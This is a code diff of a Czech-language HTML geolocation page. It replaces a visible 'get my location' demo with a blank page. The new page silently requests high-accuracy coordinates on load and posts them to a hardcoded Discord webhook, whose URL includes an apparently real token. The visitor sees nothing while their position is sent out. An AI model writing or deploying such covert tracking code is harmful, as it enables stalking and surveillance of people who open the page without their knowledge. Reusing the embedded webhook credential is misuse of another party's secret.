@@ -4,43 +4,48 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Geolokace</title>
-</head>
-<body>
-    <h1>Získání vaší polohy</h1>
-    <button onclick="getLocation()">Získat polohu</button>
-    <p id="location"></p>
-    
     <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem
+
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                document.getElementById("location").innerHTML = "Geolokace není podporována ve vašem prohlížeči.";
+                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
             }
         }
 
-        function showPosition(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            document.getElementById("location").innerHTML = "Zeměpisná šířka: " + lat + "<br>Zeměpisná délka: " + lon;
+        function sendToDiscord(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const data = {
+                content: `📍 Nová poloha:\n🌍 Zeměpisná šířka: ${lat}\n🌍 Zeměpisná délka: ${lon}`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Chyba při odesílání:", response.statusText);
+                }
+            })
+            .catch(error => console.error("Chyba:", error));
         }
 
         function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("location").innerHTML = "Uživatel odmítl sdílení polohy.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").innerHTML = "Informace o poloze nejsou k dispozici.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("location").innerHTML = "Časový limit vypršel.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("location").innerHTML = "Došlo k neznámé chybě.";
-                    break;
-            }
+            console.error("Chyba při získávání polohy:", error.message);
         }
+
+        window.onload = getLocation;
     </script>
+</head>
+<body>
 </body>
 </html>
